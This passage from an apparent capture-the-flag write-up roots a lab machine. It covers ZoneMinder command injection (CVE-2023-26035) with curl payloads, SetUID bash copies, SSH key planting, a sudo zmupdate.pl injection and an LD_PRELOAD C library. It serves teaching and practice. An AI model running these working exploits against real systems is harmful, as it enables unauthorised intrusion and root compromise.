key:f9baaa62f1487f7836cf6070f6d156fd5e75a45a,1713472444
oxdf@hacky$ CSRF=$(curl localhost:8888 -s | grep input | grep csrf_magic | cut -d'"' -f12)
oxdf@hacky$ echo $CSRF
key:df9180712415a1f92e5f81926168eb7d4c884cbd,1713472462

```

It does seem to change on each request.

[This Feb 2023 post](https://securityonline.info/cve-2023-26035-rce-flaw-in-open-source-software-application-zoneminder/) gives nice details on the vulnerability. It is in the snapshot view, where it takes the user input id and without sanitizing it, makes a command including the id that’s run via `shell_exec`.

From the [Metasploit exploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/zoneminder_snapshots.rb) I’ll get the URL and data format.

Testing with a sleep seems to show whatever command is run is run twice:

```
oxdf@hacky$ time curl http://localhost:8888/index.php -d "view=snapshot&action=create&monitor_ids[0][Id]=0;sleep 5&__csrf_magic=${CSRF}"

real    0m10.280s
user    0m0.005s
sys     0m0.000s
oxdf@hacky$ time curl http://localhost:8888/index.php -d "view=snapshot&action=create&monitor_ids[0][Id]=0;sleep 2&__csrf_magic=${CSRF}"

real    0m4.274s
user    0m0.005s
sys     0m0.000s
oxdf@hacky$ time curl http://localhost:8888/index.php -d "view=snapshot&action=create&monitor_ids[0][Id]=0;sleep 1&__csrf_magic=${CSRF}"

real    0m2.296s
user    0m0.006s
sys     0m0.000s

```

The output is not returned, so it’s blind, but that’s ok.

#### Shell

To get a shell, I’ll just make a copy of `bash` and set it SetUID/SetGID:

```
oxdf@hacky$ curl http://localhost:8888/index.php -d "view=snapshot&action=create&monitor_ids[0][Id]=0;cp /bin/bash /tmp/0xdf;chmod 6777 /tmp/0xdf&__csrf_magic=${CSRF}"

```

From the shell as matthew:

```
matthew@surveillance:~$ ls -l /tmp/0xdf
-rwsrwsrwx 1 zoneminder zoneminder 1396520 Apr 18 20:45 /tmp/0xdf

```

Running with with `-p` returns a shell with effective ids of zoneminder:

```
matthew@surveillance:~$ /tmp/0xdf -p
0xdf-5.1$ id
uid=1000(matthew) gid=1000(matthew) euid=1001(zoneminder) egid=1001(zoneminder) groups=1001(zoneminder),1000(matthew)

```

### Upgrade to SSH

I like to have a shell fully as the user I’m working as, so I’ll get a shell over SSH. There’s no `.ssh` directory in `/home/zoneminder`, so I’ll add one:

```
0xdf-5.1$ ls -la
total 24
drwxr-x--- 3 zoneminder zoneminder 4096 Apr 18 20:45 .
drwxr-xr-x 4 root       root       4096 Oct 17  2023 ..
lrwxrwxrwx 1 root       root          9 Nov  9 12:46 .bash_history -> /dev/null
-rw-r--r-- 1 zoneminder zoneminder  220 Oct 17  2023 .bash_logout
-rw-r--r-- 1 zoneminder zoneminder 3771 Oct 17  2023 .bashrc
-rw-r--r-- 1 zoneminder zoneminder  807 Oct 17  2023 .profile
drwxrwxr-x 2 zoneminder zoneminder 4096 Apr 18 20:45 .ssh

```

It’s important that my shell has both effective user and group ids as zomeinder, or I won’t be able to set the permissions correctly:

```
0xdf-5.1$ chmod 700 .ssh/
0xdf-5.1$ ls -la
total 24
drwxr-x--- 3 zoneminder zoneminder 4096 Apr 18 20:45 .
drwxr-xr-x 4 root       root       4096 Oct 17  2023 ..
lrwxrwxrwx 1 root       root          9 Nov  9 12:46 .bash_history -> /dev/null
-rw-r--r-- 1 zoneminder zoneminder  220 Oct 17  2023 .bash_logout
-rw-r--r-- 1 zoneminder zoneminder 3771 Oct 17  2023 .bashrc
-rw-r--r-- 1 zoneminder zoneminder  807 Oct 17  2023 .profile
drwx------ 2 zoneminder zoneminder 4096 Apr 18 20:45 .ssh
0xdf-5.1$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > .ssh/authorized_keys
0xdf-5.1$ chmod 600 .ssh/authorized_keys

```

Now I can SSH as zoneminder:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen zoneminder@surveillance.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
...[snip]...
zoneminder@surveillance:~$

```

## Shell as root

### Enumeration

The zoneminder user can run Perl scripts that start with `zm` in `/usr/bin` as any user with `sudo`:

```
zoneminder@surveillance:~$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *

```

There are a bunch of scripts that meet this regex:

```
zoneminder@surveillance:~$ ls /usr/bin/zm*.pl
/usr/bin/zmaudit.pl        /usr/bin/zmonvif-trigger.pl  /usr/bin/zmtrack.pl
/usr/bin/zmcamtool.pl      /usr/bin/zmpkg.pl            /usr/bin/zmtrigger.pl
/usr/bin/zmcontrol.pl      /usr/bin/zmrecover.pl        /usr/bin/zmupdate.pl
/usr/bin/zmdc.pl           /usr/bin/zmstats.pl          /usr/bin/zmvideo.pl
/usr/bin/zmfilter.pl       /usr/bin/zmsystemctl.pl      /usr/bin/zmwatch.pl
/usr/bin/zmonvif-probe.pl  /usr/bin/zmtelemetry.pl      /usr/bin/zmx10.pl

```

### Exploitation Methods

There are several ways to exploit the various ZoneMinder scripts to get a shell as root. I’ll show the two:

```
flowchart TD;
    A[Shell as zoneminder]-->B(<a href='#via-command-injection-in-zmupdatepl'>Command injection\nin zmupdate.pl</a>);
    B-->C[Shell as root];
    A-->D(<a href='#via-ld_preload-in-zoneminder'>Setting LD_PRELOAD\nin ZoneMinder</a>);
    D-->C;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 0,1,5 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### Via Command Injection in zmupdate.pl

#### Identifying

To look at these function, I’ll spend a bunch of time running `grep` to look for [ways to run system commands via Perl](https://bioinformaticsreview.com/20180506/how-to-execute-unix-shell-commands-in-a-perl-script/) such as `exec`, `system`, or `qx`. There are many cases where either no user input is passed to the call, or where the user input passed is filtered (checked to be all alphanumeric).

Eventually I’ll stumble upon `zmupdate.pl`. It has two places that build a command string and pass it to `qx` one of the Perl functions to run a system command. One is in the `patchDB` function, and the other is in the main code that runs while called.

#### Identify Injection

I’ll start at the code that calls `qx` (around line 432 on Surveillance):

```
      my $output = qx($command);

```

It’s calling `$command`. `$command` is defined between lines 411 and 430:

```
      my $command = 'mysqldump';
      if ($super) {
        $command .= ' --defaults-file=/etc/mysql/debian.cnf';
      } elsif ($dbUser) {
        $command .= ' -u'.$dbUser;
        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
      }
      if ( defined($portOrSocket) ) {
        if ( $portOrSocket =~ /^\// ) {
          $command .= ' -S'.$portOrSocket;
        } else {
          $command .= ' -h'.$host.' -P'.$portOrSocket;
        }
      } else {
        $command .= ' -h'.$host;
      }
      my $backup = '/tmp/zm/'.$Config{ZM_DB_NAME}.'-'.$version.'.dump';
      $command .= ' --add-drop-table --databases '.$Config{ZM_DB_NAME}.' > '.$backup;
      print("Creating backup to $backup. This may take several minutes.\n");
      ($command) = $command =~ /(.*)/; # detaint

```

It starts with `sqldump`, and then builds the command using variables. The `$dbpass` variable is escaped nicely with single quotes around it to prevent injection (or weird behavior with special characters in spaces). The rest are not.

Looking at the help for the script, I have control over the `dbuser`:

```
-bash-5.1$ sudo /usr/bin/zmupdate.pl --help
Unknown option: help
Usage:
    zmupdate.pl -c,--check | -f,--freshen | -v<version>,--version=<version>
    [-u <dbuser> -p <dbpass>]

Options:
    -c, --check - Check for updated versions of ZoneMinder -f, --freshen -
    Freshen the configuration in the database. Equivalent of old zmconfig.pl
    -noi --migrate-events - Update database structures as per
    USE_DEEP_STORAGE setting. -v <version>, --version=<version> - Force
    upgrade to the current version from <version> -u <dbuser>,
    --user=<dbuser> - Alternate DB user with privileges to alter DB -p
    <dbpass>, --pass=<dbpass> - Password of alternate DB user with
    privileges to alter DB -s, --super - Use system maintenance account on
    debian based systems instead of unprivileged account -d <dir>,
    --dir=<dir> - Directory containing update files if not in default build
    location -interactive - interact with the user -nointeractive - do not
    interact with the user

```

#### Get to Injection

There are a series of steps to get to this point in the code where I can try to inject. Scrolling up at line 373, there’s a check where the indentation looks like this is outside any previous `if` blocks:

```
if ( $version ) {
  my ( $detaint_version ) = $version =~ /^([\w.]+)$/;
  $version = $detaint_version;

  if ( ZM_VERSION eq $version ) {
    print("\nDatabase already at version $version, update skipped.\n\n");
    exit(0);
  }

```

It requires the `-v` input, and that is stripped of all non-word characters (so can’t be injected). The version needs to be different from the current version.

Then there’s a check that `$interactive` is true, which is the default:

```
  my $start_zm = 0;
  print("\nInitiating database upgrade to version ".ZM_VERSION." from version $version\n");
  if ( $interactive ) {
    if ( $Config{ZM_DYN_DB_VERSION} && ($Config{ZM_DYN_DB_VERSION} ne $version) ) {
      print("\nWARNING - You have specified an upgrade from version $version but the database version found is $Config{ZM_DYN_DB_VERSION}. Is this correct?\nPress enter to continue or ctrl-C to abort : ");
      my $response = <STDIN>;
    }

```

There’s a couple other blocks of code that I don’t really care about, and then this option put to the user:

```
    print("\nDo you wish to take a backup of your database prior to upgrading?\nThis may result in a large file in /tmp/zm if you have a lot of events.\nPress 'y' for a backup or 'n' to continue : ");
    my $response = <STDIN>;
    chomp($response);
    while ( $response !~ /^[yYnN]$/ ) {
      print("Please press 'y' for a backup or 'n' to continue only : ");
      $response = <STDIN>;
      chomp($response);
    }

    if ( $response =~ /^[yY]$/ ) {
      my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ );
      my $command = 'mysqldump';

```

I’ll need to say yes here to get to the `qx` call on line 432 (though it turns out that even with no I’ll still hit the other call to `qx` and the same injection works).

#### Exploit

With all of this together, I’ll pass in a user name with `$([cmd])` that will then get passed to `qx` and run by the OS. I’ll have it create another SetUID/SetGID `bash`. I’ll need to give a version that isn’t the current (which happens to be 1.36.32):

```
-bash-5.1$ sudo /usr/bin/zmupdate.pl --version 10 -u '$(/bin/bash)'

Initiating database upgrade to version 1.36.32 from version 10

WARNING - You have specified an upgrade from version 10 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort :

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-10.dump. This may take several minutes.
root@surveillance:/usr/bin#

```

The result is a shell as root! And the root flag:

```
-bash-5.1$ sudo /usr/bin/zmupdate.pl --version 10 -u '$(cp /bin/bash /tmp/0xdfroot; chown root:root /tmp/0xdfroot; chmod 6777 /tmp/0xdfroot)'

Initiating database upgrade to version 1.36.32 from version 10

WARNING - You have specified an upgrade from version 10 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort :

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-10.dump. This may take several minutes.
mysqldump: Got error: 1698: "Access denied for user '-pZoneMinderPassword2023'@'localhost'" when trying to connect
Output:
Command 'mysqldump -u$(cp /bin/bash /tmp/0xdfroot; chown root:root /tmp/0xdfroot; chmod 6777 /tmp/0xdfroot) -p'ZoneMinderPassword2023' -hlocalhost --add-drop-table --databases zm > /tmp/zm/zm-10.dump' exited with status: 2

```

It created the `bash`:

```
-bash-5.1$ ls -l /tmp/0xdfroot
-rwsrwsrwx 1 root root 1396520 Apr 19 02:24 /tmp/0xdfroot

```

Running it gets a root shell:

```
-bash-5.1$ /tmp/0xdfroot -p
0xdfroot-5.1#

```

And `root.txt`:

```
0xdfroot-5.1# cat /root/root.txt
e3a84d31************************

```

### Via LD\_PRELOAD in ZoneMinder

#### ZoneMinder Enumeration

The intended way involves seeing an interesting setting in the ZoneMinder options.

In clicking around in ZoneMinder, the “Options” menu has a “Config” page:

![image-20240418172641645](https://0xdf.gitlab.io/img/image-20240418172641645.png)

About half way down is one that seems interesting:

![image-20240418172700693](https://0xdf.gitlab.io/img/image-20240418172700693.png)

Clicking the “?” generates this pop-up:

![image-20240418172718397](https://0xdf.gitlab.io/img/image-20240418172718397.png)

#### Generate Shared Library

I’ll create the following short C program (just like in [Clicker](https://0xdf.gitlab.io/2024/01/27/htb-clicker.html#method-3-via-ld_preload)):

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("cp /bin/bash /tmp/0xdf-root");
  system("chown root:root /tmp/0xdf-root");
  system("chmod 6777 /tmp/0xdf-root");
}

```

I’ll compile it and copy it to Surveillance:

```
oxdf@hacky$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
oxdf@hacky$ scp -i ~/keys/ed25519_gen shell.so zoneminder@surveillance.htb:/tmp/
shell.so                                     100%   14KB  78.3KB/s   00:00

```

#### Exploit

I’ll update the setting in ZoneMinder. There seems to be a cron clearing this setting every minute, so it’s worth setting this again just before running the commands.

The command to run according to the help screen is `zmdc.pl`. Running it shows the help menu:

```
zoneminder@surveillance:/tmp$ sudo zmdc.pl
No command given
Usage:
    zmdc.pl {command} [daemon [options]]

Options:
    {command} - One of 'startup|shutdown|status|check|logrot' or
    'start|stop|restart|reload|version'. [daemon [options]] - Daemon name
    and options, required for second group of commands

```

It’s not clear where in the process ZoneMinder injects the `LD_PRELOAD`. It is clear the help menu is not enough.

Because I’m trying to “launch zmdc”, I’ll use the `startup` command:

```
zoneminder@surveillance:/tmp$ sudo zmdc.pl startup
Starting server

```

Now there’s a new SetUID/SetGID binary:

```
zoneminder@surveillance:/tmp$ ls -l 0xdf-root
-rwsrwsrwx 1 root root 1396520 Apr 18 21:47 0xdf-root

```

Running with `-p` to not drip privs gives a shell with effective ids of root:

```
zoneminder@surveillance:/tmp$ ./0xdf-root -p
0xdf-root-5.1# id
uid=1001(zoneminder) gid=1001(zoneminder) euid=0(root) egid=0(root) groups=0(root),1001(zoneminder)

```

Which is enough to read the flag:

```
0xdf-root-5.1# cat /root/root.txt
e3a84d31************************

```





